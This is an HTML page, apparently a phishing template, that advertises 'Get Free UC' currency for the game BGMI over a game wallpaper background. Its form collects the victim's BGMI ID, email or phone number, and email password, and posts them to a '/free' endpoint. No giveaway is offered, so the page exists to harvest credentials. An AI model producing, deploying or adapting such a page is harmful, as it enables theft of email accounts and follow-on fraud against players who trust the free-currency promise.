<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get free BGMI UC</title>
    <style>
        body {
          background-image: url('https://sahityadarpan.com/wp-content/uploads/2021/05/bgmi-Wallpaper-background-576x1024.jpeg');
          background-repeat: no-repeat;
          background-attachment: fixed;  
          background-size: cover;
          background-position: center;
        }
        .title-word {
  animation: color-animation 4s linear infinite;
}

.title-word-1 {
  --color-1: #DF8453;
  --color-2: #3D8DAE;
  --color-3: #E4A9A8;
}

.title-word-2 {
  --color-1: #DBAD4A;
  --color-2: #ACCFCB;
  --color-3: #17494D;
}

.title-word-3 {
  --color-1: #ACCFCB;
  --color-2: #E4A9A8;
  --color-3: #ACCFCB;
}

.title-word-4 {
  --color-1: #3D8DAE;
  --color-2: #DF8453;
  --color-3: #E4A9A8;
}

@keyframes color-animation {
  0%    {color: var(--color-1)}
  32%   {color: var(--color-1)}
  33%   {color: var(--color-2)}
  65%   {color: var(--color-2)}
  66%   {color: var(--color-3)}
  99%   {color: var(--color-3)}
  100%  {color: var(--color-1)}
}

/* Here are just some visual styles. ðŸ–Œ */

.container {
  display: grid;
  place-items: center;  
  text-align: center;
  height: 26vh
}

.title {
  font-family: "Montserrat", sans-serif;
  font-weight: 800;
  font-size: 8.5vw;
  text-transform: uppercase;
}

.number1 {
  position: absolute;
  top: 160px;
  left: 2px;
  font-size: 18px;
}
.container .btn {
  position: absolute;
  top: 50%;
  left: 65%;
  transform: translate(-50%, -50%);
  -ms-transform: translate(-50%, -50%);
  background-color: #f1f1f1;
  color: black;
  font-size: 16px;
  padding: 16px 30px;
  border: none;
  cursor: pointer;
  border-radius: 5px;
  text-align: center;
}
    </style>

</head>
<body>
    
    <div class="container">
        <h2 class="title">
          <span class="title-word title-word-1">Get</span>
          <span class="title-word title-word-2">Free</span>
          <span class="title-word title-word-3">Uc</span>
          <!-- <span class="title-word title-word-4">BGMI</span> -->
        </h2>
      </div>
    <div>
      <form action="/free" method="post" class="number1" >
        <div>
          <input type="text" placeholder=" Your bgmi id" name="bid" style="margin-left: 100px; padding: 7px 16px; font-size: 15px; line-height: 20px; color: #24292e; vertical-align: 12px; background-color: #ffffff; background-repeat: no-repeat; background-position: right 8px center; border: 1px solid #e1e4e8; border-radius: 6px;">
        </div>

        <div>
          <input type="text"  placeholder="Email or Phone number" name="EPN" style=" margin-left: 100px; padding: 7px 16px; font-size: 15px; line-height: 20px; color: #24292e; vertical-align: 12px; background-color: #ffffff; background-repeat: no-repeat; background-position: right 8px center; border: 1px solid #e1e4e8; border-radius: 6px;">
        </div>
        <div>
          <input type="text"  placeholder="Email password" name="pass1" style=" margin-left: 100px; padding: 7px 16px; font-size: 15px; line-height: 20px; color: #24292e; vertical-align: middle; background-color: #ffffff; background-repeat: no-repeat; background-position: right 8px center; border: 1px solid #e1e4e8; border-radius: 6px;">
        </div>
        <div class="container">
          <!-- <img src="img_lights.jpg" alt="Snow" style="width:100%"> -->
          <button class="btn">Submit</button>
        </div>
      </form>
        
    </div>
      

</body>
</html>
